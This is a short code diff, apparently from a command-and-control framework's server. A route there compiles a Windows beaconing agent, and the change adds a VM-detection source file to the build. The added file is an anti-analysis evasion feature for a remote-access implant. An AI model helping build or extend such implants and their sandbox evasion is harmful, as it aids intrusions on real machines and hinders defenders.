@@ -199,7 +199,7 @@ constexpr int BEACON_INTERVAL = 5;
                             return jsonify({"results": "[!] x86_64-w64-mingw32-g++ is not installed on the server"})
                         if payload_type == "exe":
                             log.info(f"[+] Building EXE agent with the updated config")
-                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -o agent.exe main_exe.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
+                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -o agent.exe main_exe.cpp vm_detection.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
                             with open("agent/http/agent.exe", 'rb') as f:
                                 exe_agent = f.read()
                             b64_exe_agent = base64.b64encode(exe_agent).decode("utf-8")
